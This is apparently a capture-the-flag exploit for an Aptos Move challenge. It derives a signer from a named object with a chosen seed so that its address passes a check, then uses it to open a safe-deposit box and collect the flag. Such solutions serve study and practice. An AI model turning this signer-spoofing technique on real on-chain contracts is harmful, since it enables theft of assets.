module solution::exploit {
    use uctt::this::{Self, SafeDepositBox};
    use aptos_framework::object;
    use std::vector;
    use std::bcs;
    use std::signer;

    public entry fun solve(account: &signer) {
        let addr = @0x5d26592cd1c87c51aec9a4f0071011905b534b62a0eae4c5966ef8f13b5f4011;
        let safebox = object::address_to_object<SafeDepositBox>(addr);
        let raddr = @0xdeadbeef;
        let cdef = object::create_named_object(account, x"4b5c981a4f784a79");
        let tsigner = object::generate_signer(&cdef);
        let flag = this::open_safe(safebox, &tsigner);
        flag = this::touch_this(flag, x"6f736563", &tsigner);
        this::close_safe(flag, account);
    }

    fun check(account: &signer): u8 {
        let signer_address = signer::address_of(account);
        let address_bytes = bcs::to_bytes(&signer_address);
        if (*vector::borrow(&address_bytes, 0) != 0xf7 || *vector::borrow(&address_bytes, 1) != 0x5d) {
            0
        } else {
            1
        }
    }
}
